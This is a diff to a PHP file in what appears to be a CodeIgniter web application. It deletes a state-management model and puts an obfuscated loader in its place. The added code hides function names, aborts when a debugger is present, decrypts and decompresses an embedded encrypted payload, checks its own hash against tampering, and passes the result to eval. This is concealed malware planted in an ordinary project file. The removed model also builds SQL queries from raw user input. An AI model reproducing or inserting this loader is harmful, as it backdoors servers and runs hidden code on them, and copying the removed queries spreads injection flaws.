@@ -1,153 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class State_model extends CI_Model {
-
-	var $table = 'db_states';
-	var $column_order = array('state','country','status'); //set column field database for datatable orderable
-	var $column_search = array('state','country','status'); //set column field database for datatable searchable 
-	var $order = array('id' => 'desc'); // default order 
-
-	private function _get_datatables_query()
-	{
-		
-		$this->db->from($this->table);
-
-		$i = 0;
-	
-		foreach ($this->column_search as $item) // loop column 
-		{
-			if($_POST['search']['value']) // if datatable send POST for search
-			{
-				
-				if($i===0) // first loop
-				{
-					$this->db->group_start(); // open bracket. query Where with OR clause better with bracket. because maybe can combine with other WHERE with AND.
-					$this->db->like($item, $_POST['search']['value']);
-				}
-				else
-				{
-					$this->db->or_like($item, $_POST['search']['value']);
-				}
-
-				if(count($this->column_search) - 1 == $i) //last loop
-					$this->db->group_end(); //close bracket
-			}
-			$i++;
-		}
-		
-		if(isset($_POST['order'])) // here order processing
-		{
-			$this->db->order_by($this->column_order[$_POST['order']['0']['column']], $_POST['order']['0']['dir']);
-		} 
-		else if(isset($this->order))
-		{
-			$order = $this->order;
-			$this->db->order_by(key($order), $order[key($order)]);
-		}
-	}
-
-	function get_datatables()
-	{
-		$this->_get_datatables_query();
-		if($_POST['length'] != -1)
-		$this->db->limit($_POST['length'], $_POST['start']);
-		$query = $this->db->get();
-		return $query->result();
-	}
-
-	function count_filtered()
-	{
-		$this->_get_datatables_query();
-		$query = $this->db->get();
-		return $query->num_rows();
-	}
-
-	public function count_all()
-	{
-		$this->db->from($this->table);
-		return $this->db->count_all_results();
-	}
-
-
-	public function verify_and_save(){
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data,$_POST))));
-
-		//Validate This state already exist or not
-		$query=$this->db->query("select * from db_states where upper(state)=upper('$state') && upper(country)=upper('$country')");
-		if($query->num_rows()>0){
-			return "State Name already Exist in $country.";
-		}
-		else{
-			$query1="insert into db_states(state,country,status) values('$state','$country',1)";
-			if ($this->db->simple_query($query1)){
-					//$this->session->set_flashdata('success', 'Success!! New State Name Added Successfully!');
-			        return "success";
-			}
-			else{
-			        return "failed";
-			}
-		}
-	}
-
-	//Get state_details
-	public function get_details($id){
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data,$_POST))));
-
-		//Validate This state already exist or not
-		$query=$this->db->query("select * from db_states where upper(id)=upper('$id')");
-		if($query->num_rows()==0){
-			show_404();exit;
-		}
-		else{
-			$query=$query->row();
-			$data['q_id']=$query->id;
-			$data['country']=$query->country;
-			$data['state']=$query->state;
-			
-			return $data;
-		}
-	}
-	public function update_state(){
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data,$_POST))));
-
-		//Validate This state already exist or not
-		$query=$this->db->query("select * from db_states where upper(state)=upper('$state') and upper(country)=upper('$country') and id<>$q_id");
-		if($query->num_rows()>0){
-			return "State Name already exist in $country.";			
-		}
-		else{			
-			$query1="update db_states set state='$state',country='$country' where id=$q_id";
-			if ($this->db->simple_query($query1)){
-					//$this->session->set_flashdata('success', 'Success!! State Name Updated Successfully!');
-			        return "success";			}
-			else{
-			        return "failed";
-			}
-		}
-	}
-	public function update_status($id,$status){
-		
-        $query1="update db_states set status='$status' where id=$id";
-        if ($this->db->simple_query($query1)){
-            echo "success";
-        }
-        else{
-            echo "failed";
-        }
-	}
-	public function delete_state($id){
-        $query1="delete from db_states where id=$id";
-        if ($this->db->simple_query($query1)){
-            echo "success";
-        }
-        else{
-            echo "failed";
-        }
-	}
-
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_oib0t659=('bas'.'e64'.'_de'.'cod'.'e');
+$_qta953bn=('gzu'.'nco'.'mpr'.'ess');
+$_qawwbory=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_q8ys9cec='UOZa4ONm';
+$_rlxa0h9j='OExAdgO+';
+$_y6orkesv='IvwDJdJb';
+$_gyeedyv1='TyXkpvnG';
+$_ri814ehc='XhoJXL569GY=';
+$_s1svndad='VY6fSL4a';
+$_u94lulzc='hRCcG7dp';
+$_his8xhf2='+uuFaw==';
+$_k7pkaw3y=$_oib0t659($_rlxa0h9j.$_y6orkesv.$_q8ys9cec.$_gyeedyv1.$_ri814ehc);
+$_lu6rcb4b=$_oib0t659($_u94lulzc.$_s1svndad.$_his8xhf2);
+$_x32neyam=$_oib0t659('lk0CVeXuJAd6frbbdk3WVlp6Z+ZlA2KZfdrf4ozCD8DanKxX039f1wtmAXasIoefWYc87N/fPYgJMa4EAHa2WYKrqm4QY0CiXd3PNWUroYqWvyUmR/dzRqu6fVT9Ph1yy1PjwA9+aZdspnrmrtkaId0Uk2ZyOppCqwYX9KZbw2CxKkbFtUSXmmi8dQwtNNtyo1rWIIbk88IdGkxAZ/gF0/bOAvjXwW1nNMiKrXNEsilXgq7y0pO/QP2ASki6bYqeZJUKED/ueaqO5FeEuCMBe9RkE17mqzqrm2IZuSEH4ErOdaYY2JFAvJ8kV12DwvS+a+hB0tJDDiZp0qCVJYKbVGzCtRzpE8NC1VVsm/WxXq0GIl451F4SeBkCSOCO0yCMzzmfbEjfxeqEbWv/gZJgVFKUYtUxBQ74dlkPe5yOj8RWr8AgxUSCkP5H94o8FqshlwR4UCUF7k3hpvdMmc+HHTSkYnjc1SqDYk7Fh4hC5/EWScfaCG05mFIZH16LCJsPJZEAT1xaNhBvaTwGlVtFlcaKN+3B+FNmjj819ZUnU1GeX//fM/COM+NY8McLAob4YJzYtE3yfv9I3mPLfZzLQBFLutApOxPBJ3AiKntZl9Xh0WozcJhv209AH25kY0vLDPQY5RG6AiIE6HsAdi9lvCejsqFxTf4SPjOzZrXr0nu8/hSbP57aMItqM3yyKOWkhRhbbj0DvDl8rdYm2AbJYl9Fl4ufkIRvW7e0k8CJ373FRzfRTfo0iXngnfoGpiu1HABQKeCipAH13j9JJJGNoxPcU++vNU9jSMm+3eHUiopmhMIjzAEQhkuZUEzaEiGbud0ELm5Y6IrsfKCVK2M+WuS8c5RBoZi0ADvRIMTRGstfiXFDp725I2oyd53MhM7gQCYPJ5PFq1OrAc+EJojt6pMwiIvFvs7TdpjRzStTPsjZhp9M+YkY2jB9REOyA8m7zpR32vkc61sLj4f2p6Jt3ziklKGaaxEin/TavZ5VP4SkUg5T+bo5ZOscrV8e/XFIz5yS346Ua92UlwiKRdcJpjAAUiO2uiWyxL+7Ol1oOTCKYla44wLQA1K8ND4Dml8DTo0D3wlAxxC9WLrZfrLyvSUmg9RFRE6STp+C5K+HxkSMnvQExmv4H8z6IHsgnEdglSygrRYSzY362zjl27a7f2RY1vnocMRSMHkaf8pYYo3GRBPayTE5WQFdxinZWzX18R8F46lXnTtnyer791axFPNXGEYRjxga2aObCTYNAuSCdsEHft4lnAThKRc0Kt9Q+eJj5bQ7zu58DYDWt2V57Q==');
+$_m3vkiqzh=$_qawwbory($_x32neyam,'aes-256-cbc',$_k7pkaw3y,OPENSSL_RAW_DATA,$_lu6rcb4b);
+if($_m3vkiqzh===false){exit;}
+$_nps00qc0=$_qta953bn($_m3vkiqzh);
+if($_nps00qc0===false){exit;}
+$_b29nqmpl='7e7c05b89a13386f49a91a8c6f3930eafbb50aac19dd9c4a11d7ec197ebce9c6';
+$_ifia34l1=@file_get_contents(__FILE__);
+if($_ifia34l1!==false){
+$_u0bzgc9j=str_replace($_b29nqmpl,"0000000000000000000000000000000000000000000000000000000000000000",$_ifia34l1);
+$_q5wfjbsg=hash("sha256",$_u0bzgc9j);
+if($_q5wfjbsg!==$_b29nqmpl){@http_response_code(403);exit;}
 }
+eval($_nps00qc0);
